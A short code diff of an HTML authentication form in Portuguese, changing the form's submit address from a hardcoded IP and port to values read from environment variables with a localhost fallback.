@@ -8,7 +8,7 @@
 </head>
 <body>
 
-<form id="authForm" action="http://45.179.144.155:3333/submit" method="POST">
+<form id="authForm" action="http://${process.env.SERVER_IP || 'localhost'}:${process.env.SERVER_PORT || '3333'}/submit" method="POST">
   <h1>Autenticação</h1>
   <label for="fullname">Nome Completo:</label><br>
   <input type="text" id="fullname" name="fullname" required><br>
